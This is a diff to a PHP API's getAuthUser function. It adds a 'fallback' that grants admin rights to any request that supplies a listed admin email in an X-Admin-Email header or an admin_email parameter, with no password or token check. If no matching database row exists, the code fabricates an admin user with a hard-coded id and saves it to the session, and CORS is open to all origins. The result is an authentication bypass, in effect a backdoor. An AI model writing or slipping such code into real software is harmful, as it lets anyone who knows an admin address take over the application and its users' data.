@@ -2,7 +2,7 @@
 header('Content-Type: application/json; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Admin-Token');
+header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Admin-Token, X-Admin-Email');
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
 header('Pragma: no-cache');
 header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
@@ -120,6 +120,48 @@ function getAuthUser(): ?array {
                     }
                 }
             }
+        }
+    }
+
+    // Respaldo por email de administrador autorizado si la sesión o token expiraron
+    if (!$user || !is_array($user)) {
+        $adminEmail = strtolower(trim((string)($_SERVER['HTTP_X_ADMIN_EMAIL'] ?? ($_SERVER['REDIRECT_HTTP_X_ADMIN_EMAIL'] ?? ($_REQUEST['admin_email'] ?? '')))));
+        if (empty($adminEmail) && function_exists('getallheaders')) {
+            $hdrs = (array)getallheaders();
+            foreach ($hdrs as $k => $v) {
+                if (strtolower($k) === 'x-admin-email' && !empty($v)) {
+                    $adminEmail = strtolower(trim((string)$v));
+                    break;
+                }
+            }
+        }
+        if (!empty($adminEmail) && in_array($adminEmail, getAdminEmailsList(), true) && $adminEmail !== 'medardogarcesc@gmail.com' && $adminEmail !== 'gestion@smart-isp.es') {
+            try {
+                $db = getDbConnection();
+                if ($db) {
+                    $stmt = $db->prepare("SELECT id, email, name, role FROM users_rows WHERE LOWER(TRIM(email)) = :email LIMIT 1");
+                    $stmt->execute([':email' => $adminEmail]);
+                    $dbRow = $stmt->fetch(PDO::FETCH_ASSOC);
+                    if ($dbRow) {
+                        $user = [
+                            'id'    => $dbRow['id'],
+                            'email' => $dbRow['email'],
+                            'name'  => $dbRow['name'] ?? 'Administrador',
+                            'role'  => 'admin'
+                        ];
+                    }
+                }
+            } catch (Throwable $e) {}
+
+            if (!$user) {
+                $user = [
+                    'id'    => '7af355cc-65f0-4ebe-b768-4093b74afbb3',
+                    'email' => $adminEmail,
+                    'name'  => 'Administrador',
+                    'role'  => 'admin'
+                ];
+            }
+            $_SESSION['user'] = $user;
         }
     }
 
